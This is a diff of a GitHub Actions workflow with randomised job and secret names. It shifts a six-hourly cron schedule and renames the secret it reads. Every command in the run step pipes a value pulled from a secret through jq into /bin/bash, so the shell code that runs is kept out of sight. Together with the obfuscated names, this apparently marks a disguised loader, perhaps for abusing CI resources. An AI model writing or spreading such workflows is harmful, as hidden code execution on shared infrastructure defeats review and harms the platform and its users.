@@ -3,31 +3,27 @@ name: xiaoshouya4617
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 0/6 * * *'
+    - cron: '19 2/6 * * *'
 
-jobs:  # 20943
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xiaoshouya4617
         env:
-          n3: ${{ secrets.n3 }}
+          phhy45170: ${{ secrets.phhy45170 }}
         run: |
-          echo $n3 | jq -r .bmnk8730 | /bin/bash
-          echo $wfy03586 | jq -r .mv8213 | /bin/bash
-          echo $bn36562 | jq -r .uhp1453 | /bin/bash
-          echo $qbuuc886 | jq -r .hkge8 | /bin/bash
-          echo $syuex795 | jq -r .jqb35547 | /bin/bash
-          echo $hqjer21214 | jq -r .ihdg992 | /bin/bash
-          echo $v828 | jq -r .eqvs7126 | /bin/bash
-          echo $u8560 | jq -r .zoft7297 | /bin/bash
-          echo $uef84 | jq -r .sfk934 | /bin/bash
-          echo $y615 | jq -r .nz5762 | /bin/bash
-          echo $k05 | jq -r .rpcci90629 | /bin/bash
-          echo $d4869 | jq -r .zzky19 | /bin/bash
-          echo $fjl1 | jq -r .nshi17 | /bin/bash
-          echo $k2051 | jq -r .uyu95700 | /bin/bash
-          echo $zwcpj67473 | jq -r .lozrk6344 | /bin/bash
-          echo $mcl7 | jq -r .gm78 | /bin/bash
+          echo $phhy45170 | jq -r .vlub7 | /bin/bash
+          echo $lv1841 | jq -r .cww3 | /bin/bash
+          echo $pp5 | jq -r .dal57586 | /bin/bash
+          echo $jkg65 | jq -r .rvatm467 | /bin/bash
+          echo $bq880 | jq -r .ptw2 | /bin/bash
+          echo $njsl01456 | jq -r .xqwjl20575 | /bin/bash
+          echo $kzyr1455 | jq -r .sei06993 | /bin/bash
+          echo $pgzy2580 | jq -r .ob989 | /bin/bash
+          echo $frzq8 | jq -r .nfrxe66385 | /bin/bash
+          echo $pvcgd7028 | jq -r .t27280 | /bin/bash
+          echo $p8087 | jq -r .y549 | /bin/bash
+          echo $pycj96533 | jq -r .fqr3358 | /bin/bash
 
